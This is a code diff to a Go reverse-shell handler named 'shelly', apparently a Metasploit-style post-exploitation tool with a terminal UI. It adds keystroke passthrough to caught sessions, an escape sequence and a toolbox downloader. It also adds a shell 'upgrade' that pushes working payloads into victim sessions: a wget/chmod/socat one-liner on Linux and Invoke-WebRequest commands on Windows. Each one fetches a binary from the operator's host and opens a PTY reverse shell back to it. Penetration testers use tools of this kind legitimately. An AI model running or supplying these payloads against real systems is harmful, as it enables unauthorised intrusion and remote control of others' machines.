@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"os"
+	"path/filepath"
 	"sort"
 	"strconv"
 	"strings"
@@ -22,6 +24,7 @@ type Mode int
 const (
 	ModeShelly Mode = iota
 	ModeSession
+	ModePrompt
 )
 
 var (
@@ -74,9 +77,15 @@ type Model struct {
 	Terminal        string
 	Mode            Mode
 	ActiveSessionID int
+	InSessionEscape bool
+	CapturedPrompt  string
+	LastChar        rune
 	Ready           bool
 	Width           int
 	Height          int
+
+	PromptLabel  string
+	PromptAction func(string) (Model, tea.Cmd)
 
 	// Metasploit-like options
 	Options         map[string]string
@@ -136,23 +145,130 @@ func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		if strings.Contains(string(msg), "[!] Error") {
 			m.ListenerRunning = false
 		}
+		if strings.Contains(string(msg), "Resuming upgrade") {
+			if s, ok := m.Sessions.GetSession(m.ActiveSessionID); ok {
+				var upCmd tea.Cmd
+				m, upCmd = m.executeUpgrade(m.ActiveSessionID, s.OS)
+				if upCmd != nil {
+					cmds = append(cmds, upCmd)
+				}
+			}
+		}
 
 	case NewSessionMsg:
 		log.Printf("[UI] New session %d from %s", msg.ID, msg.TargetIP)
 		m.Terminal = fmt.Sprintf("[*] New session %d connected from %s\n", msg.ID, msg.TargetIP)
 		m.ActiveSessionID = msg.ID
 		m.Mode = ModeSession
+		m.InSessionEscape = false
 		m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", msg.ID))
 
 	case StartListenerMsg:
 		log.Printf("[UI] StartListenerMsg received: host=%s port=%d", msg.Host, msg.Port)
 		if m.OnStartListener != nil {
-			m.OnStartListener(msg.Host, msg.Port)
+			go m.OnStartListener(msg.Host, msg.Port)
 		} else {
 			log.Printf("[UI] OnStartListener is nil")
 		}
 
 	case tea.KeyMsg:
+		if m.Mode == ModePrompt {
+			switch msg.Type {
+			case tea.KeyEnter:
+				input := m.Textinput.Value()
+				if m.PromptAction != nil {
+					var pCmd tea.Cmd
+					m, pCmd = m.PromptAction(input)
+					m.PromptAction = nil
+					m.Mode = ModeSession
+					m.Textinput.SetValue("")
+					m.Textinput.Placeholder = "Type a command..."
+					m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", m.ActiveSessionID))
+					if pCmd != nil {
+						cmds = append(cmds, pCmd)
+					}
+				}
+			case tea.KeyEsc:
+				m.Mode = ModeSession
+				m.Textinput.SetValue("")
+				m.Textinput.Placeholder = "Type a command..."
+				m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", m.ActiveSessionID))
+			}
+			m.Textinput, tiCmd = m.Textinput.Update(msg)
+			m.Viewport, vpCmd = m.Viewport.Update(msg)
+			cmds = append(cmds, tiCmd, vpCmd)
+			return m, tea.Batch(cmds...)
+		}
+
+		if m.Mode == ModeSession && !m.InSessionEscape {
+			// Passthrough mode
+			// Capture key data
+			var data string
+			switch msg.Type {
+			case tea.KeyRunes:
+				data = string(msg.Runes)
+			case tea.KeyEnter:
+				data = "\n"
+			case tea.KeySpace:
+				data = " "
+			case tea.KeyBackspace:
+				data = "\b"
+			case tea.KeyTab:
+				data = "\t"
+			case tea.KeyUp:
+				data = "\x1b[A"
+			case tea.KeyDown:
+				data = "\x1b[B"
+			case tea.KeyRight:
+				data = "\x1b[C"
+			case tea.KeyLeft:
+				data = "\x1b[D"
+			case tea.KeyHome:
+				data = "\x1b[H"
+			case tea.KeyEnd:
+				data = "\x1b[F"
+			case tea.KeyDelete:
+				data = "\x1b[3~"
+			case tea.KeyCtrlC:
+				data = "\x03"
+			case tea.KeyCtrlZ:
+				data = "\x1a"
+			case tea.KeyCtrlD:
+				data = "\x04"
+			}
+
+			if data != "" {
+				if s, ok := m.Sessions.GetSession(m.ActiveSessionID); ok && s.RW != nil {
+					// Detect !s
+					if m.LastChar == '!' && data == "s" {
+						// Escape triggered!
+						// Capture the current prompt line (strip trailing "!")
+						lines := strings.Split(m.Terminal, "\n")
+						if len(lines) > 0 {
+							m.CapturedPrompt = strings.TrimSuffix(lines[len(lines)-1], "!")
+						}
+						// Clean "!" from terminal display
+						m.Terminal = strings.TrimSuffix(m.Terminal, "!")
+
+						fmt.Fprint(s.RW, "s\b\b") // Clear !s from remote
+						m.InSessionEscape = true
+						m.Textinput.SetValue("")
+						m.Textinput.Prompt = promptStyle.Render(fmt.Sprintf("shelly [session %d]> ", m.ActiveSessionID))
+						m.LastChar = 0
+						return m, nil
+					}
+					// Send key to session
+					fmt.Fprint(s.RW, data)
+					if len(data) == 1 {
+						m.LastChar = rune(data[0])
+					} else {
+						m.LastChar = 0
+					}
+				}
+			}
+			return m, nil
+		}
+
 		switch msg.Type {
 		case tea.KeyCtrlC:
 			if m.Mode == ModeShelly {
@@ -177,27 +293,24 @@ func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 						cmds = append(cmds, cmd)
 					}
 				}
-			} else {
-				// ModeSession: check for escape sequence "!"
-				if strings.HasPrefix(input, "!") {
-					// One-shot shelly command
-					m.Terminal += fmt.Sprintf("\n%s %s", promptStyle.Render("shelly [session-escape]>"), input[1:])
+			} else if m.Mode == ModeSession && m.InSessionEscape {
+				// Escape command
+				if input != "" {
+					m.Terminal += fmt.Sprintf("\n%s %s", promptStyle.Render("shelly [session-escape]>"), input)
 					var cmd tea.Cmd
-					m, cmd = m.handleShellyCommand(input[1:])
+					m, cmd = m.handleShellyCommand(input)
 					m.Textinput.SetValue("")
 					if cmd != nil {
 						cmds = append(cmds, cmd)
 					}
-				} else {
-					// Regular session input
-					if s, ok := m.Sessions.GetSession(m.ActiveSessionID); ok && s.RW != nil {
-						log.Printf("[UI] Session %d input: %s", m.ActiveSessionID, input)
-						fmt.Fprintf(s.RW, "%s\n", input)
-						// Echo the command to terminal
-						if input != "" {
-							m.Terminal += fmt.Sprintf("\n%s %s", sessionPromptStyle.Render(fmt.Sprintf("session[%d]$ ", m.ActiveSessionID)), input)
-						}
+				}
+				if m.Mode == ModeSession {
+					// Visual aid: repeat host's prompt line
+					if m.CapturedPrompt != "" {
+						m.Terminal += "\n" + m.CapturedPrompt
 					}
+					m.InSessionEscape = false
+					m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", m.ActiveSessionID))
 					m.Textinput.SetValue("")
 				}
 			}
@@ -221,7 +334,9 @@ func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		}
 	}
 
-	m.Textinput, tiCmd = m.Textinput.Update(msg)
+	if m.Mode == ModeShelly || (m.Mode == ModeSession && m.InSessionEscape) || m.Mode == ModePrompt {
+		m.Textinput, tiCmd = m.Textinput.Update(msg)
+	}
 	m.Viewport, vpCmd = m.Viewport.Update(msg)
 	m.Viewport.SetContent(m.Terminal)
 	m.Viewport.GotoBottom()
@@ -232,6 +347,7 @@ func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 func (m *Model) switchToShelly() {
 	m.Mode = ModeShelly
+	m.InSessionEscape = false
 	m.Textinput.Prompt = promptStyle.Render("shelly> ")
 	m.Terminal += statusStyle.Render("\n[*] Returned to shelly prompt. Session still active in background.")
 }
@@ -248,11 +364,13 @@ func (m Model) handleShellyCommand(input string) (Model, tea.Cmd) {
 		m.Terminal += "\n  help              - Show this help"
 		m.Terminal += "\n  sessions          - List active sessions"
 		m.Terminal += "\n  use <id>          - Interact with session"
+		m.Terminal += "\n  upgrade           - Upgrade shell to socat (in session)"
 		m.Terminal += "\n  run               - Start the listener"
 		m.Terminal += "\n  exit/quit         - Exit shelly"
 		m.Terminal += "\n\n" + highlightStyle.Render("Configuration:")
 		m.Terminal += "\n  options           - Show current configuration"
 		m.Terminal += "\n  set <var> <val>   - Set a variable (LHOST, LPORT, SHELL, etc.)"
+		m.Terminal += "\n  download          - Download tools from toolbox"
 		m.Terminal += "\n\n" + highlightStyle.Render("Payloads & Tools:")
 		m.Terminal += "\n  payloads          - Show payloads for current SHELL"
 		m.Terminal += "\n  toolbox           - List available tools in toolbox"
@@ -310,12 +428,22 @@ func (m Model) handleShellyCommand(input string) (Model, tea.Cmd) {
 		if err != nil {
 			m.Terminal += fmt.Sprintf("\nError listing toolbox: %v", err)
 		} else if len(tools) == 0 {
-			m.Terminal += "\nToolbox is empty."
+			m.Terminal += "\nToolbox is empty. Use 'download' to fetch tools."
 		} else {
 			m.Terminal += "\n" + highlightStyle.Render("Available tools in toolbox:")
 			for _, t := range tools {
 				m.Terminal += fmt.Sprintf("\n  - %s (http://%s:%s/%s)", t, m.Options["LHOST"], m.Options["HTTPPORT"], t)
 			}
+		}
+
+	case "download":
+		m.Terminal += "\n[*] Starting download of all toolbox items..."
+		return m, func() tea.Msg {
+			errs := m.Toolbox.DownloadAll()
+			if len(errs) > 0 {
+				return StatusMsg(fmt.Sprintf("[!] Download errors: %d. Check logs.", len(errs)))
+			}
+			return StatusMsg("[*] All toolbox items downloaded successfully.")
 		}
 
 	case "payloads":
@@ -339,12 +467,16 @@ func (m Model) handleShellyCommand(input string) (Model, tea.Cmd) {
 			} else if s, ok := m.Sessions.GetSession(id); ok {
 				m.ActiveSessionID = id
 				m.Mode = ModeSession
+				m.InSessionEscape = false
 				m.Textinput.Prompt = sessionPromptStyle.Render(fmt.Sprintf("session[%d]> ", id))
 				m.Terminal += fmt.Sprintf("\n[*] Interacting with session %d (%s)", id, s.TargetIP)
 			} else {
 				m.Terminal += "\nSession not found"
 			}
 		}
+
+	case "back", "bg", "background":
+		m.switchToShelly()
 
 	case "exit", "quit":
 		return m, tea.Quit
@@ -353,6 +485,13 @@ func (m Model) handleShellyCommand(input string) (Model, tea.Cmd) {
 		m.Terminal = ""
 		m.Viewport.SetContent(m.Terminal)
 		m.Viewport.GotoBottom()
+
+	case "upgrade":
+		if m.Mode == ModeSession {
+			return m.startUpgrade(m.ActiveSessionID)
+		} else {
+			m.Terminal += "\n[!] Not in a session"
+		}
 
 	default:
 		m.Terminal += fmt.Sprintf("\nUnknown command: %s", parts[0])
@@ -384,12 +523,18 @@ func (m Model) View() string {
 		if s, ok := m.Sessions.GetSession(m.ActiveSessionID); ok {
 			target = s.TargetIP
 		}
-		helpStr = fmt.Sprintf("Session %d (%s) • Ctrl+Z: Shelly • !<cmd>: Shelly command • Ctrl+C: Escape", m.ActiveSessionID, target)
+		helpStr = fmt.Sprintf("Session %d (%s) • Ctrl+Z: Shelly • !s: Shelly command • Ctrl+C: Escape", m.ActiveSessionID, target)
 	}
 
 	footer := fmt.Sprintf("%s | %s",
 		m.Textinput.View(),
 		statusStyle.Render(helpStr))
+
+	if m.Mode == ModePrompt {
+		footer = fmt.Sprintf("%s %s",
+			promptStyle.Render(m.PromptLabel),
+			m.Textinput.View())
+	}
 
 	return fmt.Sprintf("%s\n%s\n%s", header, m.Viewport.View(), footer)
 }
@@ -407,6 +552,148 @@ func (m *Model) PrintPayloads() {
 	} else {
 		m.Terminal += fmt.Sprintf("\nShell '%s' not found in config", shellName)
 	}
+}
+
+func (m Model) detectOS() string {
+	lines := strings.Split(m.Terminal, "\n")
+	if len(lines) == 0 {
+		return "unknown"
+	}
+	lastLine := lines[len(lines)-1]
+
+	// Windows PowerShell: PS C:\Users\mtfd>
+	if strings.HasPrefix(lastLine, "PS ") {
+		return "windows-powershell"
+	}
+	// Windows CMD: C:\Users\mtfd>
+	if strings.Contains(lastLine, ">") && (strings.Contains(lastLine, ":\\") || strings.Contains(lastLine, "C:")) {
+		return "windows-cmd"
+	}
+	// Linux: mtfd@goose:~$ or root@goose:~#
+	if (strings.Contains(lastLine, "@") && strings.Contains(lastLine, ":")) || strings.HasSuffix(lastLine, "$ ") || strings.HasSuffix(lastLine, "# ") {
+		return "linux"
+	}
+
+	return "unknown"
+}
+
+func (m Model) startUpgrade(id int) (Model, tea.Cmd) {
+	s, ok := m.Sessions.GetSession(id)
+	if !ok {
+		m.Terminal += "\n[!] Session not found"
+		return m, nil
+	}
+
+	osName := s.OS
+	if osName == "" || osName == "unknown" {
+		osName = m.detectOS()
+	}
+
+	if osName == "unknown" {
+		m.Mode = ModePrompt
+		m.PromptLabel = "Detect OS (linux/windows-cmd/windows-powershell): "
+		m.Textinput.Placeholder = "linux"
+		m.Textinput.SetValue("")
+		m.Textinput.Prompt = promptStyle.Render("os> ")
+		m.PromptAction = func(input string) (Model, tea.Cmd) {
+			if input == "" {
+				input = "linux"
+			}
+			return m.executeUpgrade(id, input)
+		}
+		return m, nil
+	}
+
+	return m.executeUpgrade(id, osName)
+}
+
+func (m Model) executeUpgrade(id int, osName string) (Model, tea.Cmd) {
+	s, ok := m.Sessions.GetSession(id)
+	if !ok {
+		m.Terminal += "\n[!] Session not found"
+		return m, nil
+	}
+
+	// Update session OS
+	s.OS = osName
+
+	lport, _ := strconv.Atoi(m.Options["LPORT"])
+	socatPort := lport + 1
+
+	// Ensure socat binary is available in toolbox
+	var binName string
+	var archKey string
+	switch osName {
+	case "linux":
+		binName = "socatx64.bin"
+		archKey = "lin_64"
+	case "windows-cmd", "windows-powershell":
+		binName = "socatx64.exe"
+		archKey = "win_64"
+	}
+
+	if binName != "" {
+		destPath := filepath.Join(m.Toolbox.Dir, binName)
+		if _, err := os.Stat(destPath); os.IsNotExist(err) {
+			// Check if we can download it
+			var downloadURL string
+			if item, ok := m.Config.Toolbox["socat"]; ok {
+				if details, ok := item[archKey]; ok {
+					downloadURL = details.Download
+				}
+			}
+
+			if downloadURL != "" {
+				m.Mode = ModePrompt
+				m.PromptLabel = fmt.Sprintf("%s not found. Download it? (y/n): ", binName)
+				m.Textinput.Placeholder = "y"
+				m.Textinput.SetValue("")
+				m.Textinput.Prompt = promptStyle.Render("download> ")
+				m.PromptAction = func(input string) (Model, tea.Cmd) {
+					if strings.ToLower(input) == "n" {
+						m.Terminal += "\n[!] Upgrade aborted: missing " + binName
+						return m, nil
+					}
+					m.Terminal += "\n[*] Downloading " + binName + "..."
+					return m, func() tea.Msg {
+						err := m.Toolbox.DownloadFile(downloadURL, binName)
+						if err != nil {
+							return StatusMsg(fmt.Sprintf("[!] Download failed: %v", err))
+						}
+						return StatusMsg(fmt.Sprintf("[*] Downloaded %s. Resuming upgrade...", binName))
+					}
+				}
+				return m, nil
+			} else {
+				m.Terminal += fmt.Sprintf("\n[!] Warning: %s not found in toolbox and no download URL found in config.", binName)
+			}
+		}
+	}
+
+	m.Terminal += fmt.Sprintf("\n[*] Upgrading session %d to socat (OS: %s)...", id, osName)
+
+	ip := m.Options["LHOST"]
+	httpPort := m.Options["HTTPPORT"]
+
+	var payload string
+	switch osName {
+	case "linux":
+		payload = fmt.Sprintf("wget -q http://%s:%s/socatx64.bin -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d\n", ip, httpPort, ip, socatPort)
+	case "windows-cmd":
+		payload = fmt.Sprintf("powershell -c \"Invoke-WebRequest -Uri http://%s:%s/socatx64.exe -OutFile %%TEMP%%\\socat.exe\"; %%TEMP%%\\socat.exe tcp:%s:%d exec:cmd.exe,pty,stderr,setsid,sigint,sane\n", ip, httpPort, ip, socatPort)
+	case "windows-powershell":
+		payload = fmt.Sprintf("Invoke-WebRequest -Uri http://%s:%s/socatx64.exe -OutFile $env:TEMP\\socat.exe; & $env:TEMP\\socat.exe tcp:%s:%d exec:powershell.exe,pty,stderr,setsid,sigint,sane\n", ip, httpPort, ip, socatPort)
+	}
+
+	if payload != "" {
+		fmt.Fprint(s.RW, payload)
+		m.Terminal += "\n[*] Upgrade command sent. Waiting for connection on port " + strconv.Itoa(socatPort) + "..."
+	} else {
+		m.Terminal += "\n[!] No payload for OS: " + osName
+		return m, nil
+	}
+
+	return m, func() tea.Msg { return StartListenerMsg{Host: m.Options["LHOST"], Port: socatPort} }
 }
 
 func WaitForSessionData(id int, rw io.Reader, p *tea.Program) {
